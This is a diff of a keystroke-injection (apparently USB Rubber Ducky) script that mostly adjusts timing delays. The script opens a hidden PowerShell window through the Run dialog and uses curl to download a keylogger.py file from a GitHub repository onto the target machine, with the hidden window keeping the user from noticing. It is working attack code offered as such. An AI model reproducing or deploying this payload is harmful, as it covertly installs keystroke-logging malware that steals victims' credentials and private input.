@@ -1,13 +1,16 @@
-DELAY 500
-GUI r
-STRING powershell -WindowStyle hidden
 DELAY 800
-ENTER
+GUI r
+DELAY 700
+STRING powershell -WindowStyle hidden
 DELAY 500
+ENTER
+DELAY 700
 STRING curl https://raw.githubusercontent.com/Arkani/590J-JMJ/master/keylogger.py -o keylogger.py
+DELAY 200
 ENTER
 DELAY 5000
 GUI r
+DELAY 800
 STRING powershell -WindowStyle hidden
 DELAY 800
 ENTER
